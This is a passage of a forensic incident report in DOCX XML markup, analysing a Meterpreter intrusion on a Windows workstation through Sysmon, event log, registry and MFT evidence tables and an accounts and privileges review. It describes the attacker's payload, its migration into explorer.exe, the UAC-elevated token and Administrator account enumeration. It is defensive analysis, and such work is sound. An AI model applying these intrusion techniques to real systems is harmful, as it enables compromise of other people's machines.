        <w:t>No persistence mechanism was found that can be tied to the Meterpreter payload (C:\Payloads\pscp.exe) or to its migrated explorer.exe PID 7324. All autostart entries created during the incident window come from legitimate software:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Defender platform tasks</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Firefox install tasks</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- A OneDrive self-update, with its Edge WebView2/EdgeUpdate install, at 11:13:46–11:13:58</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The OneDrive update runs at the same time as the attacker's discovery commands (11:13:25–11:13:35), but it is not linked to them. Its process ancestry is OneDrive.exe → OneDriveSetup.exe, not the injected chain, and its command lines, paths and binaries are standard.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The likeliest reading is that the attacker relied on the in-memory Meterpreter session only. Persistence would then end at reboot, unless pscp.exe, test.exe or 1.exe is re-launched by hand.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Limits on this conclusion:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Sysmon covers only events from 10:51:11 onward.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No raw.native_startup, raw.dissect_cim_consumerbindings or Office-startup tables are available.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The Dissect job was partial, so a WMI repository-level consumer cannot be fully excluded beyond what the 5861 events show.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Confidence is therefore "probable" (absence of evidence within the available artefacts).</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10:51:10.748733</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\Sysmon64.exe</w:t>
              <w:br/>
              <w:t>System 7045 | Service Control Manager | A new service was installed in the system | Name: Sysmon64 | StartType: auto start | Account: LocalSystem | C:\Windows\Sysmon64.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#27966</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:54.651364</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1136, ProcessGUID: e6e9f951-0901-654e-1a00-000000000500 | RuleName: T1053 | Image: C:\Windows\system32\svchost.exe | TargetFilename: C:\Windows\System32\Tasks\OneDrive Standalone Update Task-S-1-5-21-1841083384-974204330-411256071-1001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18927</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:57.604874</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1136, ProcessGUID: e6e9f951-0901-654e-1a00-000000000500 | RuleName: T1053 | Image: C:\Windows\system32\svchost.exe | TargetFilename: C:\Windows\System32\Tasks\MicrosoftEdgeUpdateTaskUserS-1-5-21-1841083384-974204330-411256071-1001Core{D843B141-3149-47D1-9EE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#19089</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:54.724308</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 13 | Microsoft-Windows-Sysmon | RegistryEvent (Value Set) | ProcessID: 3488, ProcessGUID: e6e9f951-106b-654e-cf01-000000000500 | RuleName: T1060,RunKey | Image: C:\Users\medmondson\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe | EventType: SetValue | TargetObject: HKU\S-1-5-21-1841083384-974204330-41</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18928</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:57.559456</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 13 | Microsoft-Windows-Sysmon | RegistryEvent (Value Set) | ProcessID: 4216, ProcessGUID: e6e9f951-1075-654e-d701-000000000500 | RuleName: T1060,RunKey | Image: C:\Users\MEDMON~1\AppData\Local\Temp\EU3403.tmp\MicrosoftEdgeUpdate.exe | EventType: SetValue | TargetObject: HKU\S-1-5-21-1841083384-974204330-41125607</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#19088</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:46.104556</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t xml:space="preserve">"C:\Users\medmondson\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe" /update /restart /updateSource:ODU </w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 7932, ProcessGUID: e6e9f951-1069-654e-ce01-000000000500 | RuleName: - | MD5=6CB3F2707BDB8F78FE81E8A20790A4B9,SHA256=F580F8C17F1B8F7EDE556A6C8060B8B6B84862B380EB43F2AD3E91D048A3F7B9,IMPHASH=830D771EB3CF1FC69DCD5AFD0A4A2D9A | ParentProcess: C:\Users\medm</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18698</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:51:11.004937</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t xml:space="preserve">Microsoft-Windows-WMI-Activity/Operational 5861 | Microsoft-Windows-WMI-Activity | WMI Registration of Permanent Event Consumer | Ess: SCM Event Log Filter | Binding EventFilter: , instance of __EventFilter, {, CreatorSID = {1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0};, EventNamespace = "root\\cimv2";, Name = "SCM Event Log Filter";, Query = </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#24734</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-WMI-Activity%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 19:00:17.220160</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd, complementary batch)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\ControlSet001\Control\Session Manager</w:t>
              <w:br/>
              <w:t>Persistence | Session Manager BootExecute | BootExecute=autocheck autochk *</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_complement/recmd_complement_C.csv#34</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SYSTEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-03-19 04:49:40.979782</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $SI modification (M)</w:t>
              <w:br/>
              <w:t>C:\Windows\System32\drivers\etc\hosts</w:t>
              <w:br/>
              <w:t>size=824 [SI&lt;FN: possible timestomping]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#54482</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.683825</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7324, ProcessGUID: e6e9f951-0ded-654e-9001-000000000500 | RuleName: - | Image: C:\Windows\explorer.exe | TargetFilename: C:\Users\medmondson\AppData\Local\Temp\__PSScriptPolicyTest_4aavzn1y.m2z.ps1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18660</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:10:55.607209</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736, ProcessGUID: e6e9f951-0f56-654e-af01-000000000500 | RuleName: EXE | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | TargetFilename: C:\Users\medmondson\1.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18680</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:16:03.322916</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 11 | Microsoft-Windows-Sysmon | FileCreate | ProcessID: 7324, ProcessGUID: e6e9f951-0ded-654e-9001-000000000500 | RuleName: ProcessHostingdotNETCode | Image: C:\Windows\explorer.exe | TargetFilename: C:\Users\medmondson\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\explorer.exe.log</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#19241</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.5 Accounts, authentication and privileges</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>I reviewed Security events 4624, 4625, 4634, 4647, 4648, 4672, the 47xx account-management events, and 4798/4799/4703. I also checked TerminalServices-LSM events 21–25 (there are no 1149 or 1024 events) and the SAM via recmd UserAccounts.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Logons**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Every logon is local: type 2 interactive, or type 0/5 for SYSTEM and services.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- There are no type 3 or type 10 logons, no failed logons, no Kerberos or NTLM events, and no RDP.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The 4648 events are all OS logon-process behaviour to localhost.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Accounts**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The only account changes are from OOBE on 2023-11-09:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  - defaultuser0 and medmondson were created.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  - medmondson was added to Administrators at 11:08:58.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  - The OOBE events show an 18:58–19:00 clock offset, which is an artefact of setup.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- SAM matches this: the built-in accounts are disabled and medmondson is the only enabled admin, with 7 logons and the last one at 2023-11-10 10:42:23 (F-011).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Attacker context (F-012)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The Meterpreter chain ran as medmondson at High integrity under elevated LogonId 0x15347 (4624 at 10:42:10). That token came from UAC consent.exe at 11:02:56, followed by powershell 1088.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- No process in the chain ran as SYSTEM, so there is no getsystem evidence.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Security 4798 at 11:13:35, with net1.exe PID 0x480 as caller and SubjectLogonId 0x15347, shows the local Administrator (RID 500) being enumerated. This corroborates F-007 and was added to it as evidence.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The Administrator account was not enabled or modified afterwards.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Timeline events T-011 and T-012 and a user IOC were recorded.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-012: Meterpreter chain ran under medmondson's elevated (High IL) token LogonId 0x15347 obtained via UAC consent; local Administrator account enumerated (4798 by net1.exe)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accounts (sam)</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-sysmon%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>privilege escalation / discovery</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1078.003, T1087.001, T1548</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
